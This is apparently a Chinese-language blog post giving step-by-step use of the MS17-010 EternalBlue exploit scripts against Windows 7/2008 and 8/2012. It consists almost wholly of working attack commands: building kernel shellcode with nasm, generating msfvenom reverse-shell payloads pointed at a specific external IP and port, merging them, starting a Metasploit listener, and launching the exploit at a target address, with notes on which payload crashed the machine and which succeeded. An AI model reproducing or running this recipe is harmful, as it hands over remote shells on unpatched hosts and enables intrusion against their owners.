---
title: ms17-010 python脚本exploit
date: 2017-08-22 17:15:40
tags: ms17-010
---

脚本github : https://github.com/worawit/MS17-010

<!-- more -->

## 生成shellCode
```
 nasm -f bin eternalblue_kshellcode_x86.asm -o eternalblue_kshellcode_x86.bin           # 32位kernel code

 nasm -f bin eternalblue_kshellcode_x64.asm -o eternalblue_kshellcode_x64.bin           # 64位kernel code


 msfvenom -p windows/shell/reverse_tcp lhost=47.90.92.56 lport=5910 -f raw -o msf_shellcode_x86_ms17010_sunny5910.raw EXITFUNC=thread       # 32位msf reverse_tcp code

 msfvenom -p windows/x64/shell/reverse_tcp lhost=47.90.92.56 lport=5910 -f raw -o msf_shellcode_x64_ms17010_sunny5910.raw EXITFUNC=thread   # 64位msf reverse_tcp code


 cat eternalblue_kshellcode_x64.bin msf_shellcode_x64_ms17010_sunny5910.raw > shellcode_sunny5910_x64.bin       # 64位代码整合

 cat eternalblue_kshellcode_x86.bin msf_shellcode_x86_ms17010_sunny5910.raw > shellcode_sunny5910_x86.bin       # 32位代码整合


 python eternalblue_sc_merge.py shellcode_sunny5910_x64.bin shellcode_sunny5910_x86.bin shellcode_sunny5910_all.bin         # x86与x64代码整理（实际中有出现蓝屏，原因未知）
```
## 本地接收shell
```
sunny clientid e6cc2bd36aXXXXXXX     (个人id, 5910端口映射)

msfconsole          # 启动MSF

use exploit/multi/handler

set lhost 0.0.0.0

set lport 5910

run

```

## 攻击
eternalblue_exploit7.py  ::  Eternalblue exploit for Windows 7/2008
eternalblue_exploit8.py  ::  Eternalblue exploit for windows 8/2012 x64

```
python eternalblue_exploit7.py 10.1.1.4 shellcode_sunny5910_all.bin         # 攻击导致蓝屏

python eternalblue_exploit7.py 10.1.1.4 shellcode_sunny5910_x64.bin         # 攻击成功
```
